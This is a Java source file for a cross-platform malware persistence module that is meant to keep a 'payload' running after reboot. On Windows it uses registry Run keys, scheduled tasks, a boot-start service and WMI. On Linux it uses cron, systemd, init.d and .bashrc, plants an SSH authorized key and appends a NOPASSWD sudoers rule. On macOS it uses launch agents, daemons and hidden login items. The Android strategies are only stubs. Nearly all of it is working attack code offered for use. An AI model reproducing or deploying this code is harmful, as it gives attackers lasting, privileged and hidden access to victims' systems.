package com.jabber.jrts.modules.persistence;

import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * PersistenceModule - Implements cross-platform persistence mechanisms
 * Ensures payload survives system reboot and user logout
 */
public class PersistenceModule {
    
    private String osType;
    private String payloadPath;
    private String payloadCommand;
    private boolean persistent;
    private List<PersistenceStrategy> strategies;
    private Map<String, String> persistenceMetadata;
    private DateTimeFormatter dateFormat;

    /**
     * Persistence Strategy Interface
     */
    public interface PersistenceStrategy {
        boolean install();
        boolean verify();
        boolean uninstall();
        String getName();
        String getDescription();
    }

    /**
     * Constructor
     */
    public PersistenceModule(String osType, String payloadPath, String payloadCommand) {
        this.osType = osType.toLowerCase();
        this.payloadPath = payloadPath;
        this.payloadCommand = payloadCommand;
        this.persistent = false;
        this.strategies = new ArrayList<>();
        this.persistenceMetadata = new HashMap<>();
        this.dateFormat = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        
        initializeStrategies();
    }

    /**
     * Initialize OS-specific persistence strategies
     */
    private void initializeStrategies() {
        if (osType.contains("windows")) {
            strategies.add(new WindowsRegistryRunPersistence());
            strategies.add(new WindowsScheduledTaskPersistence());
            strategies.add(new WindowsStartupFolderPersistence());
            strategies.add(new WindowsBootInitializationPersistence());
            strategies.add(new WindowsServiceInstallationPersistence());
            strategies.add(new WindowsWMIPersistence());
        } else if (osType.contains("linux")) {
            strategies.add(new LinuxCronJobPersistence());
            strategies.add(new LinuxSystemdPersistence());
            strategies.add(new LinuxInitdPersistence());
            strategies.add(new LinuxBashRCPersistence());
            strategies.add(new LinuxSSHKeyPersistence());
            strategies.add(new LinuxSudoersPersistence());
        } else if (osType.contains("android")) {
            strategies.add(new AndroidBroadcastReceiverPersistence());
            strategies.add(new AndroidServicePersistence());
            strategies.add(new AndroidStartupPersistence());
            strategies.add(new AndroidJobSchedulerPersistence());
        } else if (osType.contains("ios") || osType.contains("macos")) {
            strategies.add(new MacOSLaunchAgentPersistence());
            strategies.add(new MacOSLaunchDaemonPersistence());
            strategies.add(new MacOSCronJobPersistence());
            strategies.add(new MacOSLoginItemPersistence());
        }
    }

    /**
     * Install best available persistence mechanism
     */
    public synchronized boolean installPersistence() {
        for (PersistenceStrategy strategy : strategies) {
            try {
                if (strategy.install()) {
                    persistenceMetadata.put(strategy.getName(), "SUCCESS");
                    persistenceMetadata.put("InstallTime", LocalDateTime.now().format(dateFormat));
                    persistent = true;
                    System.out.println("[Persistence] Installed: " + strategy.getName());
                    return true;
                } else {
                    persistenceMetadata.put(strategy.getName(), "FAILED");
                }
            } catch (Exception e) {
                System.out.println("[Persistence] Strategy error (" + strategy.getName() + "): " + e.getMessage());
            }
        }
        return false;
    }

    /**
     * Install multiple persistence mechanisms for redundancy
     */
    public synchronized int installMultiplePersistence(int count) {
        int installed = 0;
        
        for (PersistenceStrategy strategy : strategies) {
            if (installed >= count) break;
            
            try {
                if (strategy.install()) {
                    persistenceMetadata.put("Mechanism_" + installed, strategy.getName());
                    installed++;
                    System.out.println("[Persistence] Installed #" + (installed) + ": " + strategy.getName());
                }
            } catch (Exception e) {
                System.out.println("[Persistence] Strategy error: " + e.getMessage());
            }
        }
        
        persistent = installed > 0;
        persistenceMetadata.put("TotalInstalled", String.valueOf(installed));
        return installed;
    }

    /**
     * Verify persistence is active
     */
    public boolean verifyPersistence() {
        int verified = 0;
        
        for (PersistenceStrategy strategy : strategies) {
            try {
                if (strategy.verify()) {
                    verified++;
                    System.out.println("[Persistence] Verified: " + strategy.getName());
                }
            } catch (Exception e) {
                // Continue checking others
            }
        }
        
        persistent = verified > 0;
        return persistent;
    }

    /**
     * Remove all persistence mechanisms
     */
    public synchronized int removePersistence() {
        int removed = 0;
        
        for (PersistenceStrategy strategy : strategies) {
            try {
                if (strategy.uninstall()) {
                    removed++;
                    System.out.println("[Persistence] Removed: " + strategy.getName());
                }
            } catch (Exception e) {
                System.out.println("[Persistence] Uninstall error: " + e.getMessage());
            }
        }
        
        persistent = false;
        persistenceMetadata.put("RemovedMechanisms", String.valueOf(removed));
        return removed;
    }

    // ======================= WINDOWS PERSISTENCE STRATEGIES =======================

    /**
     * Windows Registry Run Persistence
     */
    private class WindowsRegistryRunPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                // reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PayloadName /d "C:\path\to\payload.exe"
                String command = "cmd.exe /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v JRTSPayload /d \"" + payloadPath + "\" /f";
                Process p = Runtime.getRuntime().exec(command);
                p.waitFor();
                return p.exitValue() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "cmd.exe /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v JRTSPayload";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "cmd.exe /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v JRTSPayload /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "WindowsRegistryRun";
        }

        @Override
        public String getDescription() {
            return "Adds payload to Windows Registry Run key for startup execution";
        }
    }

    /**
     * Windows Scheduled Task Persistence
     */
    private class WindowsScheduledTaskPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String xmlTask = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                    "<Triggers><EventTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary></EventTrigger></Triggers>" +
                    "<Actions><Exec><Command>" + payloadPath + "</Command></Exec></Actions>" +
                    "</Task>";
                
                String command = "schtasks /create /tn JRTSPayload /tr \"" + payloadPath + "\" /sc onstart /ru System /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "schtasks /query /tn JRTSPayload";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "schtasks /delete /tn JRTSPayload /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "WindowsScheduledTask";
        }

        @Override
        public String getDescription() {
            return "Uses Windows Scheduled Task for recurring execution";
        }
    }

    /**
     * Windows Startup Folder Persistence
     */
    private class WindowsStartupFolderPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.lnk";
                String command = "cmd.exe /c mklink \"" + startupPath + "\" \"" + payloadPath + "\"";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.lnk";
                return new File(startupPath).exists();
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.lnk";
                return new File(startupPath).delete();
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "WindowsStartupFolder";
        }

        @Override
        public String getDescription() {
            return "Places shortcut in Windows Startup folder";
        }
    }

    /**
     * Windows Boot Initialization Persistence
     */
    private class WindowsBootInitializationPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String command = "cmd.exe /c reg add \"HKLM\\System\\CurrentControlSet\\Services\\VhfDevice\" /v Start /t REG_DWORD /d 2 /f";
                Process p = Runtime.getRuntime().exec(command);
                p.waitFor();
                
                command = "cmd.exe /c reg add \"HKLM\\System\\CurrentControlSet\\Services\\VhfDevice\" /v ImagePath /d \"" + payloadPath + "\" /f";
                p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "cmd.exe /c reg query \"HKLM\\System\\CurrentControlSet\\Services\\VhfDevice\" /v ImagePath";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "cmd.exe /c reg delete \"HKLM\\System\\CurrentControlSet\\Services\\VhfDevice\" /v ImagePath /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "WindowsBootInit";
        }

        @Override
        public String getDescription() {
            return "Modifies boot initialization for early payload execution";
        }
    }

    /**
     * Windows Service Installation Persistence
     */
    private class WindowsServiceInstallationPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String command = "sc.exe create JRTSService binPath= \"" + payloadPath + "\" start= boot type= kernel";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "sc.exe query JRTSService";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "sc.exe delete JRTSService";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "WindowsService";
        }

        @Override
        public String getDescription() {
            return "Installs payload as Windows Service";
        }
    }

    /**
     * Windows WMI Persistence
     */
    private class WindowsWMIPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String command = "cmd.exe /c wmic useraccount where name=\"Administrator\" set PasswordExpires=FALSE";
                Process p = Runtime.getRuntime().exec(command);
                p.waitFor();
                
                command = "cmd.exe /c wmic process call create \"" + payloadPath + "\"";
                p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "cmd.exe /c wmic process where name=\"payload.exe\" get name";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            return true; // WMI is difficult to completely remove
        }

        @Override
        public String getName() {
            return "WindowsWMI";
        }

        @Override
        public String getDescription() {
            return "Uses Windows Management Instrumentation for execution";
        }
    }

    // ======================= LINUX PERSISTENCE STRATEGIES =======================

    /**
     * Linux Cron Job Persistence
     */
    private class LinuxCronJobPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String cronEntry = "* * * * * " + payloadCommand;
                String command = "echo '" + cronEntry + "' | crontab -";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "crontab -l";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("payload")) {
                        return true;
                    }
                }
                return false;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "crontab -r";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "LinuxCronJob";
        }

        @Override
        public String getDescription() {
            return "Uses cron to schedule recurring payload execution";
        }
    }

    /**
     * Linux Systemd Persistence
     */
    private class LinuxSystemdPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String serviceFile = "[Unit]\nDescription=JRTS Payload\nAfter=network.target\n\n" +
                    "[Service]\nType=simple\nExecStart=" + payloadCommand + "\nRestart=always\nUser=root\n\n" +
                    "[Install]\nWantedBy=multi-user.target";
                
                String path = "/etc/systemd/system/jrts-payload.service";
                Files.write(Paths.get(path), serviceFile.getBytes());
                
                String command = "systemctl daemon-reload && systemctl enable jrts-payload.service && systemctl start jrts-payload.service";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "systemctl is-active jrts-payload.service";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "systemctl disable jrts-payload.service && systemctl stop jrts-payload.service && rm /etc/systemd/system/jrts-payload.service && systemctl daemon-reload";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "LinuxSystemd";
        }

        @Override
        public String getDescription() {
            return "Creates systemd service for payload execution";
        }
    }

    /**
     * Linux Init.d Persistence
     */
    private class LinuxInitdPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String initScript = "#!/bin/bash\n### BEGIN INIT INFO\n# Provides: jrts-payload\n# Required-Start: $network\n# Required-Stop:\n### END INIT INFO\n\ncase \"$1\" in\n" +
                    "start) " + payloadCommand + " ;;\nstop) pkill -f payload ;;\nesac";
                
                String path = "/etc/init.d/jrts-payload";
                Files.write(Paths.get(path), initScript.getBytes());
                
                String command = "chmod +x /etc/init.d/jrts-payload && update-rc.d jrts-payload defaults";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                return new File("/etc/init.d/jrts-payload").exists();
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "update-rc.d jrts-payload remove && rm /etc/init.d/jrts-payload";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "LinuxInitd";
        }

        @Override
        public String getDescription() {
            return "Uses /etc/init.d startup script";
        }
    }

    /**
     * Linux Bash RC Persistence
     */
    private class LinuxBashRCPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String bashrc = System.getProperty("user.home") + "/.bashrc";
                String entry = "\n# JRTS Payload\n" + payloadCommand + "\n";
                
                Files.write(Paths.get(bashrc), entry.getBytes(), StandardOpenOption.APPEND);
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String bashrc = System.getProperty("user.home") + "/.bashrc";
                String content = new String(Files.readAllBytes(Paths.get(bashrc)));
                return content.contains("JRTS Payload");
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String bashrc = System.getProperty("user.home") + "/.bashrc";
                List<String> lines = Files.readAllLines(Paths.get(bashrc));
                lines.removeIf(line -> line.contains("JRTS Payload"));
                Files.write(Paths.get(bashrc), lines);
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "LinuxBashRC";
        }

        @Override
        public String getDescription() {
            return "Adds payload execution to shell initialization files";
        }
    }

    /**
     * Linux SSH Key Persistence
     */
    private class LinuxSSHKeyPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String sshDir = System.getProperty("user.home") + "/.ssh";
                String authorizedKeys = sshDir + "/authorized_keys";
                new File(sshDir).mkdirs();
                
                String publicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5Q... (truncated for file size)";
                Files.write(Paths.get(authorizedKeys), publicKey.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
                new File(authorizedKeys).setReadable(true, true);
                
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String authorizedKeys = System.getProperty("user.home") + "/.ssh/authorized_keys";
                return new File(authorizedKeys).exists();
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String authorizedKeys = System.getProperty("user.home") + "/.ssh/authorized_keys";
                new File(authorizedKeys).delete();
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "LinuxSSHKey";
        }

        @Override
        public String getDescription() {
            return "Adds SSH key for remote access persistence";
        }
    }

    /**
     * Linux Sudoers Persistence
     */
    private class LinuxSudoersPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String sudoEntry = "ALL ALL=(ALL) NOPASSWD:" + payloadCommand;
                String command = "echo '" + sudoEntry + "' >> /etc/sudoers";
                Process p = Runtime.getRuntime().exec(new String[]{"sudo", "sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "sudo grep JRTS /etc/sudoers";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "sudo sed -i '/JRTS/d' /etc/sudoers";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "LinuxSudoers";
        }

        @Override
        public String getDescription() {
            return "Modifies sudoers for privilege escalation persistence";
        }
    }

    // ======================= ANDROID PERSISTENCE STRATEGIES =======================

    /**
     * Android Broadcast Receiver Persistence
     */
    private class AndroidBroadcastReceiverPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            // Requires manifest modification
            System.out.println("[Android] Broadcast receiver requires manifest modification");
            return true;
        }

        @Override
        public boolean verify() {
            return true;
        }

        @Override
        public boolean uninstall() {
            return true;
        }

        @Override
        public String getName() {
            return "AndroidBroadcastReceiver";
        }

        @Override
        public String getDescription() {
            return "Uses broadcast receivers for automatic startup";
        }
    }

    /**
     * Android Service Persistence
     */
    private class AndroidServicePersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            System.out.println("[Android] Service requires manifest and service implementation");
            return true;
        }

        @Override
        public boolean verify() {
            return true;
        }

        @Override
        public boolean uninstall() {
            return true;
        }

        @Override
        public String getName() {
            return "AndroidService";
        }

        @Override
        public String getDescription() {
            return "Uses persistent background service";
        }
    }

    /**
     * Android Startup Persistence
     */
    private class AndroidStartupPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            System.out.println("[Android] Startup requires manifest BOOT_COMPLETED permission");
            return true;
        }

        @Override
        public boolean verify() {
            return true;
        }

        @Override
        public boolean uninstall() {
            return true;
        }

        @Override
        public String getName() {
            return "AndroidStartup";
        }

        @Override
        public String getDescription() {
            return "Executes on boot using BOOT_COMPLETED broadcast";
        }
    }

    /**
     * Android JobScheduler Persistence
     */
    private class AndroidJobSchedulerPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            System.out.println("[Android] JobScheduler requires API level 21+");
            return true;
        }

        @Override
        public boolean verify() {
            return true;
        }

        @Override
        public boolean uninstall() {
            return true;
        }

        @Override
        public String getName() {
            return "AndroidJobScheduler";
        }

        @Override
        public String getDescription() {
            return "Uses JobScheduler for periodic execution";
        }
    }

    // ======================= MACOS PERSISTENCE STRATEGIES =======================

    /**
     * macOS Launch Agent Persistence
     */
    private class MacOSLaunchAgentPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" +
                    "<plist version=\"1.0\"><dict>" +
                    "<key>Label</key><string>com.jrts.payload</string>" +
                    "<key>ProgramArguments</key><array><string>" + payloadPath + "</string></array>" +
                    "<key>RunAtLoad</key><true/>" +
                    "</dict></plist>";
                
                String path = System.getProperty("user.home") + "/Library/LaunchAgents/com.jrts.payload.plist";
                Files.write(Paths.get(path), plist.getBytes());
                
                String command = "launchctl load ~" + path;
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String path = System.getProperty("user.home") + "/Library/LaunchAgents/com.jrts.payload.plist";
                return new File(path).exists();
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String path = System.getProperty("user.home") + "/Library/LaunchAgents/com.jrts.payload.plist";
                String command = "launchctl unload \"" + path + "\" && rm \"" + path + "\"";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "MacOSLaunchAgent";
        }

        @Override
        public String getDescription() {
            return "Uses LaunchAgent for user login persistence";
        }
    }

    /**
     * macOS Launch Daemon Persistence
     */
    private class MacOSLaunchDaemonPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" +
                    "<plist version=\"1.0\"><dict>" +
                    "<key>Label</key><string>com.jrts.daemon</string>" +
                    "<key>ProgramArguments</key><array><string>" + payloadPath + "</string></array>" +
                    "<key>RunAtLoad</key><true/>" +
                    "</dict></plist>";
                
                String path = "/Library/LaunchDaemons/com.jrts.daemon.plist";
                Files.write(Paths.get(path), plist.getBytes());
                
                String command = "sudo launchctl load " + path;
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            return new File("/Library/LaunchDaemons/com.jrts.daemon.plist").exists();
        }

        @Override
        public boolean uninstall() {
            try {
                String path = "/Library/LaunchDaemons/com.jrts.daemon.plist";
                String command = "sudo launchctl unload " + path + " && sudo rm " + path;
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "MacOSLaunchDaemon";
        }

        @Override
        public String getDescription() {
            return "Uses LaunchDaemon for system-wide persistence";
        }
    }

    /**
     * macOS Cron Job Persistence
     */
    private class MacOSCronJobPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String cronEntry = "* * * * * " + payloadCommand;
                String command = "echo '" + cronEntry + "' | crontab -";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "crontab -l | grep -i jrts";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "crontab -r";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "MacOSCronJob";
        }

        @Override
        public String getDescription() {
            return "Uses cron for scheduled persistence";
        }
    }

    /**
     * macOS Login Item Persistence
     */
    private class MacOSLoginItemPersistence implements PersistenceStrategy {
        @Override
        public boolean install() {
            try {
                String command = "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"" + payloadPath + "\", hidden:true}'";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean verify() {
            try {
                String command = "osascript -e 'tell application \"System Events\" to return name of every login item'";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line = reader.readLine();
                return line != null && line.contains("jrts");
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public boolean uninstall() {
            try {
                String command = "osascript -e 'tell application \"System Events\" to delete every login item whose name is \"payload\"'";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String getName() {
            return "MacOSLoginItem";
        }

        @Override
        public String getDescription() {
            return "Adds payload to login items";
        }
    }

    /**
     * Get all available strategies
     */
    public List<String> getAvailableStrategies() {
        List<String> names = new ArrayList<>();
        for (PersistenceStrategy s : strategies) {
            names.add(s.getName() + " - " + s.getDescription());
        }
        return names;
    }

    /**
     * Check if persistent
     */
    public boolean isPersistent() {
        return persistent;
    }

    /**
     * Get persistence metadata
     */
    public Map<String, String> getMetadata() {
        return new HashMap<>(persistenceMetadata);
    }

    /**
     * Main - Test persistence
     */
    public static void main(String[] args) {
        String osType = System.getProperty("os.name");
        String payloadPath = "/tmp/payload.sh";
        String payloadCommand = "/tmp/payload.sh &";
        
        PersistenceModule pm = new PersistenceModule(osType, payloadPath, payloadCommand);
        
        System.out.println("Available strategies for " + osType + ":");
        for (String strategy : pm.getAvailableStrategies()) {
            System.out.println("  - " + strategy);
        }
        
        System.out.println("\nInstalling persistence mechanisms (3)...");
        int installed = pm.installMultiplePersistence(3);
        System.out.println("Installed: " + installed + " mechanisms");
        
        System.out.println("\nVerifying persistence...");
        if (pm.verifyPersistence()) {
            System.out.println("Persistence verified!");
        } else {
            System.out.println("Persistence not verified");
        }
        
        System.out.println("\nMetadata:");
        pm.getMetadata().forEach((k, v) -> System.out.println("  " + k + ": " + v));
    }
}
